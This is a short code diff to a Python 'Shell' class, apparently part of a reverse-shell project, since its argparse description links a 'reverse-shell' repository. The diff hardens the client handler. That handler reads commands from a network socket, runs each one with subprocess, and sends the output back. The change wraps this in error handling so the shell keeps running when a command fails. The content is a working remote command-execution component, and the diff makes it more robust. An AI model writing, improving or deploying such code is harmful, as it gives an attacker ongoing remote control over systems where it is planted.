@@ -35,9 +35,15 @@ class Shell:
 
     def handle_client(self, client, address):
         while True:
-            cmd = client.recv(1024).strip().decode()
-            output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
-            client.send(output)
+            try:
+                cmd = client.recv(1024).strip().decode()
+                if cmd:
+                    output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
+                    client.send(output)
+
+            except Exception as e:
+                client.send(str(e).encode())
+
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(description='https://github.com/hu-jeff/reverse-shell')
